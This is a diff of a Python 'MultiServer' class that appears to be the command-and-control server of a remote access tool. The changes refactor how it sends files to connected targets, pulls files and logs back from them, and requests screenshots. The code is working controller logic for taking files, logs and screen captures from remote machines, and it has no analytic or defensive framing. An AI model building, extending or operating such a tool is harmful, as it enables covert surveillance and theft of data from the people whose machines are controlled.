@@ -319,12 +319,9 @@ class MultiServer(object):
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return target, conn
 
-    def send_file(self, conn):
+    def send_file(self, conn, file_to_transfer, save_as):
         """ Send file from Server to Client """
-        file_to_transfer = input('File to Transfer to Client: ')
-        save_as = input('Save as: ')
 
-        self.send(conn, json_dumps(['--s', save_as]))
         self.receive(conn, _print=False)
         print('Transferring file...')
         for line in read_file(file_to_transfer):
@@ -334,13 +331,9 @@ class MultiServer(object):
         self.send(conn, b'<FILE TRANSFER DONE>')
         self.receive(conn)
 
-    def receive_file(self, conn):
+    def receive_file(self, conn, save_as):
         """ Transfer file from Client to Server """
 
-        file_to_transfer = input('File to Transfer to Server: ')
-        save_as = input('Save as: ')
-
-        self.send(conn, json_dumps(['--r', file_to_transfer]))
         print('Transferring file...')
         with open(save_as, 'wb') as f:
             while 1:
@@ -472,9 +465,7 @@ class MultiServer(object):
             return
         if '--l' in command:
             self.send(conn, json_dumps(['--l']))
-            data = self.receive(conn, _print=False)
-            with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
-                f.write(data)
+            self.receive_file(conn, '{}.log'.format(str(datetime.now()).replace(':','-')))
             print('Log saved.')
             return
         if command[:3] == '--k':
@@ -527,10 +518,16 @@ class MultiServer(object):
             self.receive(conn)
             return
         if '--s' in command:
-            self.send_file(conn)
+            file_to_transfer = input('File to Transfer to Client: ')
+            save_as = input('Save as: ')
+            self.send(conn, json_dumps(['--s', save_as]))
+            self.send_file(conn, file_to_transfer, save_as)
             return
         if '--r' in command:
-            self.receive_file(conn)
+            file_to_transfer = input('File to Transfer to Server: ')
+            save_as = input('Save as: ')
+            self.send(conn, json_dumps(['--r', file_to_transfer]))
+            self.receive_file(conn, save_as)
             return
         if '--g' in command:
             self.screenshot(conn)
